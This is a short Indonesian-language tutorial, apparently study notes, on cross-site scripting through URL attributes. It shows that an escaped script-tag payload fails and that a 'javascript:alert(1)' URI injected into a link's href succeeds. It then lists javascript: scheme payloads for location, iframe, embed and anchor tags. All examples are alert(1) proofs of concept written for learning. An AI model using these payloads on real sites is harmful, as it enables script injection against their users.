# URL Injection & JavaScript Scheme Exploitation Basics

## Attacking URLs

RESEP :
  - HTML Attributes 
  - HTML Tags
  - Javascript Function
  - URL Schemes



Beberapa atribut di rancang khusus untuk url,seperti tag `<a>` dan `<iframe>`.

### Contoh 

**UI:**
Input = `1amkaiz3n`
Output = Klik [1amkaiz3n](https://tes.com)


**Inspect result:**

```html
<a href="1amkaiz3n"> Klik 
  <h1>1amkaiz3n</h1>
</a>
```


Disni kita bisa melihat bahwa input kita di gunakan baik dalam atribut `href`,maupun dalam `<h1>` konten untuk tautan itu.

### Contoh Attack

Disini,jika kita inject dengan payload sebelumnya seprti ini :

`"><script>alert(1)</script>`

Ini tidak ada berhasil,dan hanya akan menampilkan apa adanay seperti ini `"><script>alert(1)</script>`.Dan jika kita lihat di Inspect,maka akan terlihat seperti ini :

```html
<a href=""><script>alert(1)</script>"> Klik 
  <h1>"><script>alert(1)</script></h1>
</a>
```

Element tersebut sedang di **Escape HTML**,sehingga browser tidak memperlakukan kode sebagai kode,melainkan hanya sebagai text.Jadi ini menghilangkan kemungkinan untuk keluar dari atribut,dan inject script tag.Jadi sebagai gantinya,kita akan menyerang URL secara langsung dengan menggunakan **JavaScript URI scheme** (atau sering juga disebut **javascript protocol**).

**Biasanya disebut**:
  - JavaScript URI scheme
  - javascript protocol
  - javascript pseudo-protocol
  - dalam bug bounty: JS scheme injection

Formatnya :
`javascript:alert(1)`

**Penjelasan singkat**
  - javascript: adalah URI scheme
  - dipakai di context URL (misalnya href)
  - browser akan mengeksekusi isi setelah `:` sebagai JavaScript

Contoh klasik:

`<a href="javascript:alert(1)">Click</a>`

Jadi,di inputnay kita akan masukkan payload seperti ini :

`javascript:alert(1)`

Dan ini akan menjadi seperti ini :
```html
<a href="javascript:alert(1)"> Klik 
  <h1>javascript:alert(1)</h1>
</a>
```

Yang dimana,jika kia klik,,mak ini akan menampilkn Pop UP alert.
Javacript Schemes dapat di gunakan dalam 
  - `location ='javascript:alert(1)'`
  - `<iframe src="javascript:alert(1)"></iframe>`
  - `<embed src="javascript:alert(1)"></embed>`
  - `<a> href="javascript:alert(1)"> Link</a>`